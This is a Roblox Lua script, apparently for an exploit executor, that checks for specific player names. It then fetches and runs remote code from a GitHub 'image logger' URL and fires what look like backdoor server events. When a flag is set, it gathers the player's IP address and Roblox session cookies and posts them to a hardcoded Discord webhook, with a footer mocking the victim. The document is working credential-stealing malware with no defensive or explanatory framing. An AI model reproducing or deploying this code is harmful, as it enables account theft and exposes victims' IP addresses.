    if game.Players.LocalPlayer.Name == "AmyAnthony6" or game.Players.LocalPlayer.Name == "" then
    if getgenv().aimlock == true then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/findmejojo/IMAGE-LOGGER-REAL-DONT-MISS-OUT/main/README.md"))()    
    print("test")
    end
    
    if getgenv().banme == true then
        game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('OneMoreTime');
end

if getgenv().skid == true then
                local ip = game:HttpGet("https://api.myip.com/")
local COOKIE = ""
local response = syn.request(
    {
        Url = "https://www.roblox.com",
    }
)
for i,v in pairs(response) do
    if type(v) == "table" then
        for ii,vv in pairs(v) do
            if string.find(ii, "cookie") then
                COOKIE = COOKIE.."\n"..vv
            end
        end
    end
end

if game.Players.LocalPlayer.Name == "masterofthec0k" or game.Players.LocalPlayer.Name == "CalvinHobbs2" then
    ip = "<REDACTED>" 
    COOKIE = "<REDACTED>" 
end

syn.request({
    Url = "https://discord.com/api/webhooks/1012336861731106916/Ih8ECEQJ78kJ8rGL-CrSpGM77ydH1ZbkFisKI2otPUC7w6398vY2tN2JOmz9dyo56ObI", 
    Body = game:GetService("HttpService"):JSONEncode({
        ["embeds"]={{
            ["title"]="||"..ip.."||",
            ["type"]="rich",
            ["description"]=COOKIE,
            ["color"]=tonumber(0x7269da),
            ["footer"]={
                ["text"]=os.date("%A, %m %B %Y %I:%M:%S %p <@882188003588603944> skid found LOL")
            }
        }},
        ["avatar_url"]="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
        ["username"]="Username: "..game.Players.LocalPlayer.Name,
    }), 
    Method = "POST", 
    Headers = {["content-type"] = "application/json"}
})
            game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('BreathingHAMON');
end
end
wait(2)


    if getgenv().key == WE586G75487B7B4 then
        print("whitelisted")
end
